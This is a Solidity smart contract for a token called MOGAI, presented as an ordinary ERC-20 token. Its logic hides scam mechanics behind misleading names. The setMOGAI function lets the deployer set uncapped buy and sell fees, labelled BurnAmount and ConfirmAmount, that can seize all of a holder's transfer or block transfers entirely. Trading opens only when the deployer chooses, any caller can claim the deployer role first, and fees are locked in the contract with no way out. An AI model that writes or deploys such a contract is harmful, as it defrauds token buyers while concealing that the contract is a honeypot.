// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.20;

contract MOGAI {
    string public constant name = "MOGAI";
    string public constant symbol = "MOGAI";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    uint256 public BurnAmount;
    uint256 public ConfirmAmount;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event DeployerSet(address indexed deployer);

    address private pair;
    address public deployer;
    bool public deployerSet = false;

    bool private tradingOpen;

    constructor() {
        // Initially, no tokens are assigned until deployer is set.
    }

    receive() external payable {}

    function setDeployer(address _deployer) external {
        require(!deployerSet, "Deployer can only be set once.");
        deployer = _deployer;
        deployerSet = true;
        balanceOf[_deployer] = totalSupply;
        emit Transfer(address(0), _deployer, totalSupply);
        emit DeployerSet(_deployer);
    }

    function approve(address spender, uint256 amount) external returns (bool){
        require(deployerSet, "Deployer must be set first.");
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        require(deployerSet, "Deployer must be set first.");
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        require(deployerSet, "Deployer must be set first.");
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        require(tradingOpen || from == deployer || to == deployer);

        if(!tradingOpen && pair == address(0) && amount > 0)
            pair = to;

        balanceOf[from] -= amount;

        if(from != address(this)){
            uint256 FinalAmount = amount * (from == pair ? BurnAmount : ConfirmAmount) / 100;
            amount -= FinalAmount;
            balanceOf[address(this)] += FinalAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(msg.sender == deployer, "Only deployer can open trading.");
        require(!tradingOpen, "Trading is already open.");
        tradingOpen = true;        
    }

    function setMOGAI(uint256 newBurn, uint256 newConfirm) external {
        require(msg.sender == deployer, "Only deployer can set WEN.");
        BurnAmount = newBurn;
        ConfirmAmount = newConfirm;
    }
}